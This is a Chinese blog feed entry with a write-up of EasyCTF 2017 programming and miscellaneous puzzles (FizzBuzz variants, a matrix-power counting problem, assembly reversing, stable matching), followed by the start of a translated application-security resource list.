    <published>2017-04-09T02:02:00.000Z</published>
    <updated>2017-10-02T19:22:31.593Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://i4.buimg.com/589513/f3a5f79cc07a98f1.png" alt=""></p><p>作者:<a href="https://www.zhihu.com/people/sunnyelf/" target="_blank" rel="external">Jing Ling</a><br>博客:<a href="https://www.hackfun.org" target="_blank" rel="external">HackFun</a></p><h1 id="0x00-Miscellaneous"><a href="#0x00-Miscellaneous" class="headerlink" title="0x00 Miscellaneous"></a>0x00 Miscellaneous</h1><h2 id="IRC"><a href="#IRC" class="headerlink" title="IRC"></a>IRC</h2><h3 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h3><p>EasyCTF has an IRC channel! Check out <code>#easyctf2017</code> on freenode to claim a free flag, and stick around to get on-the-fly updates during the competition.</p><a id="more"></a><h3 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h3><p>了解一波<a href="http://baike.baidu.com/item/IRC/10410" target="_blank" rel="external">IRC</a>，熟悉一下操作命令，找到<code>Cannot join channel (+r) - you need to be identified with services</code> 的<a href="https://superuser.com/questions/106965/how-do-i-identify-with-services-on-irc" target="_blank" rel="external">解决方法</a>，成功加入到<code>#easyctf2017</code>的频道。<br><img src="http://i.imgur.com/W8j9k6R.png" alt=""></p><h2 id="A-maze-ing"><a href="#A-maze-ing" class="headerlink" title="A-maze-ing"></a>A-maze-ing</h2><h3 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h3><p>Solve a maze! ‘j’ is left, ‘k’ is down, ‘l’ is right, and ‘i’ is up. You input directions in a string. An example: “jkliilillikjk”. Submit your input string as the flag. (Whoops! You don’t have a maze, do you? Sucks to be you.</p><h3 id="solution-1"><a href="#solution-1" class="headerlink" title="solution"></a>solution</h3><pre><code>easyctf{jjjjjjjjjjjjjjjjjjj}easyctf{kkkkkkkkkkkkkkkkkkk}</code></pre><p>参考：<a href="https://www.zhihu.com/question/25539346" target="_blank" rel="external">一个迷宫从入口进去，沿着右手边的墙走，是否肯定能走到出口？</a></p><h1 id="0x01-Programming"><a href="#0x01-Programming" class="headerlink" title="0x01 Programming"></a>0x01 Programming</h1><h2 id="Hello-world"><a href="#Hello-world" class="headerlink" title="Hello, world!"></a>Hello, world!</h2><h3 id="problem-2"><a href="#problem-2" class="headerlink" title="problem"></a>problem</h3><p>Use your favorite programming language to print <code>Hello, world!</code> to stdout! Use the programming interface to do this!</p><p>Programming Judge codes:</p><pre><code>AC: acceptedWA: WRONG ANSWER (you&apos;re bad)TLE: time limit exceeded (make your code faster)RTE: runtime errorJE: judge error (contact an admin if you encounter this)CE: compilation error</code></pre><h3 id="solution-2"><a href="#solution-2" class="headerlink" title="solution"></a>solution</h3><pre><code>print(&apos;Hello, world!&apos;)</code></pre><h2 id="Things-Add-Up"><a href="#Things-Add-Up" class="headerlink" title="Things Add Up"></a>Things Add Up</h2><h3 id="problem-3"><a href="#problem-3" class="headerlink" title="problem"></a>problem</h3><p>For this problem you will utilise the programming interface, which you can access via the navigation bar at the top of your screen.</p><p>The input for your program will be given via STDIN - that’s cin, input(), and System.in for cxx, Python, and Java respectively. Output goes to STDOUT - cout, print, and System.out. Your program will be run on several sets of input, and if your output matches ours for each testcase, this problem will be marked solved.</p><p>We’ll start with a simple challenge. Each testcase has two lines of input. The first will contain an integer <code>N</code>. The second will contain a sequence of integers <code>a_1, a_2, ..., a_N</code>. You are to output the sum of that sequence - that is, <code>a_1 + a_2 + ... + a_n</code>. Good luck!</p><p>Input Constraints</p><pre><code>0 &lt; N &lt; 100-1000 &lt; a_i &lt; 1000</code></pre><p>Sample Input</p><pre><code>52 4 7 3 1</code></pre><p>Sample Output</p><pre><code>17</code></pre><h3 id="solution-3"><a href="#solution-3" class="headerlink" title="solution"></a>solution</h3><pre><code>n = input()s = raw_input().split()r = 0for x in xrange(n):    r += int(s[x])print(r)</code></pre><h2 id="Fizz-Buzz-1"><a href="#Fizz-Buzz-1" class="headerlink" title="Fizz Buzz 1"></a>Fizz Buzz 1</h2><h3 id="problem-4"><a href="#problem-4" class="headerlink" title="problem"></a>problem</h3><p>Write a program that takes an integer <code>n</code> as input.</p><p>Output the numbers 1 through <code>n</code>, in increasing order, one per line.</p><p>However, replace any line that is a multiple of 3 with <code>Fizz</code> and any that are a multiple of 5 with <code>Buzz</code>. Any line that is a multiple of 3 and 5 should be written as <code>FizzBuzz</code>.</p><p>The input will be the number of lines to write, n, followed by a linebreak.</p><p>Sample input:</p><pre><code>17</code></pre><p>Sample output:</p><pre><code>12Fizz4BuzzFizz78FizzBuzz11Fizz1314FizzBuzz1617</code></pre><h3 id="solution-4"><a href="#solution-4" class="headerlink" title="solution"></a>solution</h3><pre><code>n = input()for x in xrange(1, n + 1):    if x % 3 == 0:        if x % 5 == 0:            print(&apos;FizzBuzz&apos;)        else:            print(&apos;Fizz&apos;)    elif x % 5 == 0:        print(&apos;Buzz&apos;)    else:        print(x)</code></pre><h2 id="Library"><a href="#Library" class="headerlink" title="Library"></a>Library</h2><h3 id="problem-5"><a href="#problem-5" class="headerlink" title="problem"></a>problem</h3><p>Your librarian has a 2-row bookshelf that can contain N books in each row. She wants to know the number of ways that she can fill the bookshelf with red-colored books and blue-colored books such that no 2 red-colored books are adjacent to each other (horizontally or vertically).</p><p>Input: the integer, N (1&lt;=N&lt;=2^1024)</p><p>Output: the number of ways you can place red-colored books and blue-colored books onto a N-column bookshelf. Since this number might be really big, output it mod 10^9+7.</p><p>Example: Input: 2</p><p>Your valid bookshelf layouts are:</p><pre><code>BBBBBBBRBRBBRBBBBBRBRBBRBRRB</code></pre><p>Therefore, Output: 7</p><h3 id="solutin"><a href="#solutin" class="headerlink" title="solutin"></a>solutin</h3><p>画图或编程找出规律公式，然后就是数学推导，最后编程计算：</p><p><img src="http://i.imgur.com/auAdvVk.png" alt=""><br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line">n = input()</div><div class="line">temp = np.array([[<span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">2</span>]])</div><div class="line">matrix = np.array([[<span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">2</span>]])</div><div class="line">init = np.array([[<span class="number">3</span>], [<span class="number">7</span>]])</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(n - <span class="number">2</span>):</div><div class="line">    temp = np.dot(temp, matrix)</div><div class="line">result = np.dot(temp, init)</div><div class="line">print(result[<span class="number">0</span>][<span class="number">0</span>] % (<span class="number">10</span> ** <span class="number">9</span> + <span class="number">7</span>))</div></pre></td></tr></table></figure><p></p><p>来自VictorZC表哥的矩阵快速幂解法：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">n = input()</div><div class="line">   p = n<span class="number">-2</span></div><div class="line">   a0=<span class="number">0</span></div><div class="line">   a1=<span class="number">1</span></div><div class="line">   a2=<span class="number">1</span></div><div class="line">   a3=<span class="number">2</span></div><div class="line">   r0=<span class="number">1</span></div><div class="line">   r1=<span class="number">0</span></div><div class="line">   r2=<span class="number">0</span></div><div class="line">   r3=<span class="number">1</span></div><div class="line">   mod=<span class="number">10</span>**<span class="number">9</span>+<span class="number">7</span></div><div class="line">   <span class="keyword">while</span> p&gt;<span class="number">0</span>:</div><div class="line">       <span class="keyword">if</span> p%<span class="number">2</span>==<span class="number">1</span>:</div><div class="line">           c0=a0*r0+a1*r2</div><div class="line">           c1=a0*r1+a1*r3</div><div class="line">           c2=a2*r0+a3*r2</div><div class="line">           c3=a2*r1+a3*r3</div><div class="line">           r0=c0%mod</div><div class="line">           r1=c1%mod</div><div class="line">           r2=c2%mod</div><div class="line">           r3=c3%mod</div><div class="line">       c0=a0*a0+a1*a2</div><div class="line">       c1=a0*a1+a1*a3</div><div class="line">       c2=a2*a0+a3*a2</div><div class="line">       c3=a2*a1+a3*a3</div><div class="line">       a0=c0%mod</div><div class="line">       a1=c1%mod</div><div class="line">       a2=c2%mod</div><div class="line">       a3=c3%mod</div><div class="line">       p=p//<span class="number">2</span></div><div class="line">   <span class="keyword">if</span> n==<span class="number">1</span>:</div><div class="line">       <span class="keyword">print</span> <span class="number">3</span></div><div class="line">   <span class="keyword">else</span>:</div><div class="line">       <span class="keyword">print</span> (r2*<span class="number">3</span>+r3*<span class="number">7</span>)%mod</div></pre></td></tr></table></figure><p></p><h2 id="Fzz-Buzz-2"><a href="#Fzz-Buzz-2" class="headerlink" title="Fzz Buzz 2"></a>Fzz Buzz 2</h2><h3 id="problem-6"><a href="#problem-6" class="headerlink" title="problem"></a>problem</h3><p>Oh no! Two of my keys are broken! Please help me make the same Fzz Buzz program, sans that one letter and queston marks.<br>As a side note, use of <code>eval()</code> and <code>exec()</code> is also frowned upon and will be marked invalid.</p><h3 id="solution-5"><a href="#solution-5" class="headerlink" title="solution"></a>solution</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Create aliases</span></div><div class="line">f = getattr(globals()[<span class="string">'__bu\x69lt\x69ns__'</span>],<span class="string">'\x69nput'</span>)</div><div class="line">p = getattr(globals()[<span class="string">'__bu\x69lt\x69ns__'</span>],<span class="string">'pr\x69nt'</span>)</div><div class="line"></div><div class="line"><span class="comment"># Get user input</span></div><div class="line">n = f()</div><div class="line"></div><div class="line"><span class="comment"># Prints text for line k and calls itself with the next line</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">go</span><span class="params">(k)</span>:</span></div><div class="line">    a = ((k % <span class="number">15</span> == <span class="number">0</span>) <span class="keyword">and</span> p(<span class="string">'F\x69zzBuzz'</span>))</div><div class="line">    a = ((k % <span class="number">3</span> != <span class="number">0</span> <span class="keyword">and</span> k % <span class="number">5</span> == <span class="number">0</span>) <span class="keyword">and</span> p(<span class="string">'Buzz'</span>))</div><div class="line">    a = ((k % <span class="number">3</span> == <span class="number">0</span> <span class="keyword">and</span> k % <span class="number">5</span> != <span class="number">0</span>) <span class="keyword">and</span> p(<span class="string">'F\x69zz'</span>))</div><div class="line">    a = ((k % <span class="number">3</span> != <span class="number">0</span> <span class="keyword">and</span> k % <span class="number">5</span> != <span class="number">0</span>) <span class="keyword">and</span> p(k))</div><div class="line">    a = ((k &lt; n) <span class="keyword">and</span> go(k + <span class="number">1</span>))</div><div class="line"></div><div class="line">go(<span class="number">1</span>)</div></pre></td></tr></table></figure><h2 id="Down-a-Notch"><a href="#Down-a-Notch" class="headerlink" title="Down a Notch"></a>Down a Notch</h2><h3 id="problem-7"><a href="#problem-7" class="headerlink" title="problem"></a>problem</h3><p>I’ve spent too long in the high level, let’s take the level <a href="https://raw.githubusercontent.com/EasyCTF/easyctf-2017-problems/master/down-a-notch/check" target="_blank" rel="external">down a notch</a>. Help me find the correct input to this function!<br>Your answer should be in the format <code>a:b</code> where <code>a</code> and <code>b</code> are integers. Do <strong>not</strong> wrap it with <code>easyctf{}</code>.<br>Hint: Compiled with x86-64 gcc 4.9.4</p><pre><code>check(int, int):        pushq   %rbp        movq    %rsp, %rbp        movl    %edi, -36(%rbp)        movl    %esi, -40(%rbp)        movl    -36(%rbp), %eax        xorl    -40(%rbp), %eax        movl    %eax, -4(%rbp)        movl    -4(%rbp), %eax        addl    $98, %eax        movl    %eax, -8(%rbp)        movl    -8(%rbp), %eax        notl    %eax        movl    %eax, %edx        movl    -40(%rbp), %eax        addl    %edx, %eax        movl    %eax, -12(%rbp)        movl    -12(%rbp), %eax        xorl    -36(%rbp), %eax        movl    %eax, -16(%rbp)        movl    -40(%rbp), %eax        imull   -4(%rbp), %eax        cltd        idivl   -8(%rbp)        movl    %eax, %edx        movl    -36(%rbp), %eax        leal    (%rdx,%rax), %ecx        movl    -12(%rbp), %edx        movl    -16(%rbp), %eax        addl    %edx, %eax        xorl    %ecx, %eax        movl    %eax, -20(%rbp)        cmpl    $-814, -20(%rbp)        sete    %al        popq    %rbp        ret</code></pre><h3 id="solution-6"><a href="#solution-6" class="headerlink" title="solution"></a>solution</h3><p>推荐文章：<a href="http://www.jianshu.com/p/5910b9e63644" target="_blank" rel="external">从汇编角度浅析C程序</a></p><p>简单的汇编代码理解:</p><pre><code>push rbpmov rbp, rspmov [rbp-36], edimov [rbp-40], esimov eax,[rbp-36]   ;eax = r36xor [rbp-40], eax  ;r40 = r40 ^ eaxmov [rbp-4], eax   ;r4 = eaxmov eax, [rbp-4]   ;eax = r4add eax, 98        ;eax = eax + 98mov [rbp-8], eax   ;r8 = eaxmov eax, [rbp-8]   ;eax = r8not eax            ;eax = ~ eaxmov edx, eax       ;edx = eaxmov eax,[rbp-40]   ;eax = r40 add eax, edx       ;eax = eax + edxmov [rbp-12], eax  ;r12 = eaxmov eax, [rbp-12]  ;eax = r12mov eax, [rbp-36]  ;eax = r36mov [rbp-16], eax  ;r16 = eaxmov eax, [rbp-40]  ;eax = r40imul eax, [rbp-4]  ;eax = eax * r4cltdidiv [rbp-8]       ;eax = eax / r8 edx = eax % r8mov edx, eax       ;edx = eaxmov eax, [rbp-36]  ;eax = r36lea ecx, [rdx+rax] mov edx, [rbp-12]  ;edx =r12mov eax, [rbp-16]  ;eax = r16add eax, edx       ;eax = eax + edxxorl ecx, eax      ;ecx = ecx ^ edxmovl eax, [rbp-20] ;eax = r20cmpl -814, [rbp-20];r20 ?= -814sete alpopq [rbp]ret</code></pre><hr><pre><code>a = input()b = input()c = a ^ bd = 98 + ce = ~d + bf = e ^ ag = a + b * c / d ^ e + fg ?= -814</code></pre><p>整理一下：</p><pre><code>g = a + b * (a ^ b) / (98 + (a ^ b)) ^ (~(98 + a ^ b) + b) + (~(98 + a ^ b) + b) ^ a</code></pre><p>二元一次方程求解，暴力跑一下：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(a, b)</span>:</span></div><div class="line">    c = a ^ b</div><div class="line">    d = <span class="number">98</span> + c</div><div class="line">    e = ~d + b</div><div class="line">    f = e ^ a</div><div class="line">    res = a + b * c / d ^ e + f</div><div class="line">    <span class="keyword">if</span> res == <span class="number">-814</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">1000</span>):</div><div class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">1000</span>):</div><div class="line">        find = <span class="keyword">False</span></div><div class="line">        <span class="keyword">if</span> check(a, b):</div><div class="line">            find = <span class="keyword">True</span></div><div class="line">            <span class="keyword">print</span> <span class="string">"%d:%d"</span> % (a, b) <span class="comment"># 14:975</span></div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">if</span> find:</div><div class="line">        <span class="keyword">break</span></div></pre></td></tr></table></figure><p></p><h2 id="MWayward-Space-Junk"><a href="#MWayward-Space-Junk" class="headerlink" title="MWayward Space Junk"></a>MWayward Space Junk</h2><h2 id="problem-8"><a href="#problem-8" class="headerlink" title="problem"></a>problem</h2><p>I’m trying to destroy some space junk, but it won’t stop moving!</p><pre><code>nc wayward.tcp.easyctf.com 8580</code></pre><p>Pilot Key: <code>7554eb73dc155375b47b4a655a27332b</code></p><p>hint: Try figuring out the trajectory of the junk.</p><h2 id="solution-7"><a href="#solution-7" class="headerlink" title="solution"></a>solution</h2><p><a href="https://writeups.easyctf.com/programming.html" target="_blank" rel="external">writeup</a></p><h2 id="Match-Me"><a href="#Match-Me" class="headerlink" title="Match Me"></a>Match Me</h2><h2 id="problem-9"><a href="#problem-9" class="headerlink" title="problem"></a>problem</h2><p>When making pairings between two sets of objects based on their preferences (in this case people), there can be multiple stable solutions, stable meaning that no two elements would prefer to be matched with each other over their current matching. A side-effect of having multiple solutions is that there are solutions favor one group over the other.</p><p>We received two files, one listing men and the other women. Each line contains a name, followed by a series of numbers. Each number N corresponds to their preference to be matched with the Nth member of the opposite list, with 1 being the highest.</p><p>For example, the entry “Joe 4, 5, 3, 1, 2” means that Joe would most prefer the 4th entry on the opposite list, and least prefer the 2nd.</p><p>We have heard that there are some pairings that will be together in all possible stable matchings, please find them. However, because there are quite a bit of them, please submit your solution as the following:</p><p>MD5 hash of <code>(male_1,female_1)(male_2,female_2)...(male_n,female_n)</code>, where the pairings are sorted alphabetically by male names. For example, <code>(Bob,Susie)(Jim,Carol)(Tom,Emma)</code> would be submitted as <code>b0d75104ce4b3a7d892f745fd515fea4</code>.</p><p>Here are the lists of preferences:<a href="https://raw.githubusercontent.com/HackThisCode/CTF-Writeups/master/2017/EasyCTF/Match%20me/male" target="_blank" rel="external">male preferences</a>, <a href="https://raw.githubusercontent.com/HackThisCode/CTF-Writeups/master/2017/EasyCTF/Match%20me/female" target="_blank" rel="external">female preferences</a>.</p><p>Hint: This is a fairly well-known graph problem. I would guess there is some sort of internet source on it.</p><h2 id="solution-8"><a href="#solution-8" class="headerlink" title="solution"></a>solution</h2><p><a href="https://github.com/HackThisCode/CTF-Writeups/tree/master/2017/EasyCTF/Match%20me" target="_blank" rel="external">writeup</a><br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#https://www.youtube.com/watch?v=Qcv1IqHWAzg</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(maleFile,femaleFile,reverse)</span>:</span></div><div class="line">    <span class="comment">#These -10000's and such are to pad the array,</span></div><div class="line">    <span class="comment">#so nth id represents nth index</span></div><div class="line">    males = [[<span class="number">-10000</span>]]</div><div class="line">    maleIDNameMap = &#123;&#125;</div><div class="line">    females = [[<span class="number">-10000</span>]]</div><div class="line">    femaleIDNameMap = &#123;&#125;</div><div class="line">    loadData(males,maleIDNameMap,maleFile)</div><div class="line">    loadData(females,femaleIDNameMap,femaleFile)</div><div class="line">    <span class="comment">#Format is that the man's index is there id, and inside is [x,y] where y is id of person they're paired with,</span></div><div class="line">    <span class="comment"># and x is his rank for that person, rank being 0-based</span></div><div class="line">    manCurrentAssignments = [[<span class="number">1000000</span>,<span class="number">-1000</span>]]*len(males)</div><div class="line">    unassignedWomenIDs = list(range(<span class="number">1</span>,len(females)))</div><div class="line">    <span class="keyword">while</span>(len(unassignedWomenIDs) != <span class="number">0</span>):</div><div class="line">        <span class="comment">#use i, so I don't ahve to worry about modifying list while looping through it.</span></div><div class="line">        i = len(unassignedWomenIDs) - <span class="number">1</span></div><div class="line">        <span class="keyword">while</span>(i &gt;= <span class="number">0</span>):</div><div class="line">            womanID = unassignedWomenIDs[i]</div><div class="line">            i-=<span class="number">1</span></div><div class="line">            <span class="comment">#pop so that I don't check same combo again later.</span></div><div class="line">            nextPrefferedManID = females[womanID].pop(<span class="number">0</span>)</div><div class="line"></div><div class="line">            thisWomanPrefferenceRank = males[nextPrefferedManID].index(womanID)</div><div class="line"></div><div class="line">            <span class="keyword">if</span>(manCurrentAssignments[nextPrefferedManID][<span class="number">0</span>] &gt; thisWomanPrefferenceRank):</div><div class="line">                <span class="comment"># assign this woman to this man</span></div><div class="line">                <span class="keyword">del</span> unassignedWomenIDs[i+<span class="number">1</span>]</div><div class="line">                oldAssigneeID = manCurrentAssignments[nextPrefferedManID][<span class="number">1</span>]</div><div class="line">                <span class="keyword">if</span>(oldAssigneeID==<span class="number">-1000</span>):</div><div class="line">                    <span class="comment">#ezpz</span></div><div class="line">                    manCurrentAssignments[nextPrefferedManID] = [thisWomanPrefferenceRank,womanID]</div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    <span class="comment">#gotta kick off old woman, and try everything in range 1... cur</span></div><div class="line">                    <span class="comment">#except I'm doing something clever and only keeping men she hasn't tried on listRef</span></div><div class="line">                    <span class="comment">#so program may just iterate a few more times. No recursive dealing with kicking off more</span></div><div class="line">                    <span class="comment">#and more women.</span></div><div class="line">                    unassignedWomenIDs.append(oldAssigneeID)</div><div class="line">                    manCurrentAssignments[nextPrefferedManID] = [thisWomanPrefferenceRank,womanID]</div><div class="line"></div><div class="line">    output = []</div><div class="line">    <span class="keyword">if</span>(reverse):</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(males)):</div><div class="line">            output.append([femaleIDNameMap[manCurrentAssignments[i][<span class="number">1</span>]],maleIDNameMap[i]])</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(males)):</div><div class="line">            output.append([maleIDNameMap[i],femaleIDNameMap[manCurrentAssignments[i][<span class="number">1</span>]]])</div><div class="line">    <span class="keyword">return</span> output</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">loadData</span><span class="params">(listRef,idRef,fname)</span>:</span></div><div class="line">    lines = []</div><div class="line">    <span class="keyword">with</span> open(fname) <span class="keyword">as</span> f:</div><div class="line">        lines = f.readlines()</div><div class="line"></div><div class="line">    i = <span class="number">1</span></div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</div><div class="line">        elements = line.split(<span class="string">' '</span>)</div><div class="line">        idRef[i] = elements[<span class="number">0</span>]</div><div class="line">        tmp = []</div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>,len(elements)):</div><div class="line">            tmp.append(int(elements[k][:<span class="number">-1</span>]))</div><div class="line">        listRef.append(tmp)</div><div class="line">        i += <span class="number">1</span></div><div class="line"></div><div class="line"></div><div class="line">maleFirst   = main(<span class="string">'male'</span>,<span class="string">'female'</span>,<span class="keyword">False</span>)</div><div class="line">femaleFirst = main(<span class="string">'female'</span>,<span class="string">'male'</span>,<span class="keyword">True</span> )</div><div class="line"></div><div class="line">toMD5 = []</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> maleFirst:</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> femaleFirst:</div><div class="line">        <span class="keyword">if</span>(i[<span class="number">0</span>] == j[<span class="number">0</span>]):</div><div class="line">            <span class="keyword">if</span>(i[<span class="number">1</span>]==j[<span class="number">1</span>]):</div><div class="line">                toMD5.append(i)</div><div class="line"></div><div class="line"><span class="comment"># For MD5</span></div><div class="line">md5String = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> toMD5:</div><div class="line">    md5String += <span class="string">"(%s,%s)"</span> %(i[<span class="number">0</span>], i[<span class="number">1</span>])</div><div class="line">print(md5String)</div><div class="line">md5 = hashlib.md5(md5String.encode()).hexdigest()</div><div class="line">print(md5)</div></pre></td></tr></table></figure><p></p>]]></content>
    
    <summary type="html">
    
      [http://i4.buimg.com/589513/f3a5f79cc07a98f1.png]

作者:Jing Ling [https://www.zhihu.com/people/sunnyelf/]
博客:HackFun [https://www.hackfun.org]

#0X00-MISCELLANEOUS0X00 MISCELLANEOUS
#IRCIRC
#PROBLEMPROBLEM
EasyCTF has an IRC channel! Check out #easyctf2017 on freenode to claim a free
flag, and stick around to get on-the-fly updates during the competition.
    
    </summary>
    
      <category term="CTF" scheme="https://sunnyelf.github.io/categories/CTF/"/>
    
    
      <category term="misc" scheme="https://sunnyelf.github.io/tags/misc/"/>
    
      <category term="miscellaneous" scheme="https://sunnyelf.github.io/tags/miscellaneous/"/>
    
      <category term="ctf writeup" scheme="https://sunnyelf.github.io/tags/ctf-writeup/"/>
    
      <category term="easyctf" scheme="https://sunnyelf.github.io/tags/easyctf/"/>
    
      <category term="programming" scheme="https://sunnyelf.github.io/tags/programming/"/>
    
  </entry>
  
  <entry>
    <title>超棒应用程序安全清单</title>
    <link href="https://sunnyelf.github.io/2017/04/08/%E8%B6%85%E6%A3%92%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8%E6%B8%85%E5%8D%95/"/>
    <id>https://sunnyelf.github.io/2017/04/08/超棒应用程序安全清单/</id>
    <published>2017-04-08T10:55:00.000Z</published>
    <updated>2017-10-02T19:22:31.876Z</updated>
    
    <content type="html"><![CDATA[<h1 id="超棒应用程序安全清单"><a href="#超棒应用程序安全清单" class="headerlink" title="超棒应用程序安全清单 "></a>超棒应用程序安全清单 <a href="https://github.com/sindresorhus/awesome" target="_blank" rel="external"><img src="https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg" alt="Awesome"></a></h1><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p><a href="https://www.hackfun.org/" target="_blank" rel="external">Personal Blog</a></p><p><a href="https://github.com/sunnyelf/awesome-application-security" target="_blank" rel="external">Github Adress</a></p><p><a href="https://github.com/paragonie/awesome-appsec" target="_blank" rel="external">English Version</a></p><h1 id="0x01-正文"><a href="#0x01-正文" class="headerlink" title="0x01 正文"></a>0x01 正文</h1><p><a href="https://github.com/paragonie/awesome-appsec" target="_blank" rel="external">English Version</a></p><p>学习应用程序安全的资源列表，包含书籍，网站，博客文章和自我评估测验等，由<a href="https://paragonie.com" target="_blank" rel="external">Paragon Initiative Enterprises</a>公司维护，由应用安全开发社区贡献，我们<a href="https://paragonie.com/projects" target="_blank" rel="external">其他社区项目</a>可能对未来的应用安全领域也有用哦，如果你是应用安全的小白，那可能会从<a href="https://paragonie.com/blog/2015/08/gentle-introduction-application-security" target="_blank" rel="external">深入浅出讲应用安全</a>一文中受益。</p><h1 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a>贡献</h1><p><a href="https://github.com/paragonie/awesome-appsec/blob/master/CONTRIBUTING.md" target="_blank" rel="external">请参考贡献指南了解详情</a>.</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><ul><li><a href="#通用">通用</a><ul><li><a href="#文章">文章</a><ul><li><a href="#如何安全地生成随机数-2014"><a href="http://sockpuppet.org/blog/2014/02/25/safely-generate-random-numbers/" target="_blank" rel="external">如何安全地生成随机数</a> (2014)</a></li><li><a href="#加盐哈希密码的正确姿势-2014"><a href="https://crackstation.net/hashing-security.htm" target="_blank" rel="external">加盐哈希密码的正确姿势</a> (2014)</a></li><li><a href="#devurandom不当使用-2014"><a href="http://insanecoding.blogspot.co.uk/2014/05/a-good-idea-with-bad-usage-devurandom.html" target="_blank" rel="external">/dev/urandom不当的使用</a> (2014)</a></li><li><a href="#why-invest-in-application-security-2015"><a href="https://paragonie.com/white-paper/2015-why-invest-application-security" target="_blank" rel="external">Why Invest in Application Security?</a> 